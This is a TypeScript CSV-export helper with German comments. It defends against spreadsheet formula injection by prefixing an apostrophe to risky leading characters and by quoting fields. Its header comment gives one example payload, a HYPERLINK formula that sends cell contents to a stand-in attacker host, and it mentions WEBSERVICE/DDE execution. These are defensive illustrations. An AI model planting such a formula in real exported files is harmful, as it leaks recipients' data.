/**
 * CSV-Helper mit Formula-Injection-Schutz (CWE-1236).
 *
 * Excel/LibreOffice/Google Sheets werten Zellen, die mit `=`, `+`, `-`, `@`,
 * TAB oder CR beginnen, beim Oeffnen als Formel aus. Wenn die Datei vom
 * Server kommt und attacker-kontrollierte Felder enthaelt (z.B.
 * `customer_name`), kann eine Formel wie
 *
 *   =HYPERLINK("https://attacker/x?b="&A1,"Bezahlt")
 *
 * beim Klick interne Daten an den Angreifer-Server schicken oder mit
 * `=WEBSERVICE(...)`/DDE Code ausfuehren.
 *
 * `escapeCsvField` setzt vor solche Werte einen Apostroph (`'`) und quotet
 * das Ganze. Anschliessend werden interne Quotes verdoppelt — RFC 4180.
 */

const FORMULA_INITIAL_CHARS = /^[=+\-@\t\r]/;
const NEEDS_QUOTING = /[";\n\r]/;

export function escapeCsvField(input: unknown, sep: ';' | ',' = ';'): string {
  if (input === null || input === undefined) return '';
  let value = String(input);

  // 1) Formula-Injection-Schutz: fuehrendes ' anhaengen
  if (FORMULA_INITIAL_CHARS.test(value)) {
    value = `'${value}`;
  }

  // 2) Quoten falls noetig (Separator, Anfuehrungszeichen, Newlines)
  const needsQuotes = NEEDS_QUOTING.test(value) || value.includes(sep);
  if (needsQuotes) {
    value = `"${value.replace(/"/g, '""')}"`;
  }

  return value;
}

/**
 * Baut eine CSV-Zeile aus mehreren Feldern. Jedes Feld wird sicher escapet.
 */
export function buildCsvRow(fields: unknown[], sep: ';' | ',' = ';'): string {
  return fields.map((f) => escapeCsvField(f, sep)).join(sep);
}

/**
 * Hilfsfunktion fuer komplette CSV-Dokumente.
 * BOM (﻿) am Anfang sorgt dafuer, dass Excel UTF-8 korrekt erkennt.
 */
export function buildCsv(rows: unknown[][], sep: ';' | ',' = ';'): string {
  return '﻿' + rows.map((r) => buildCsvRow(r, sep)).join('\r\n');
}
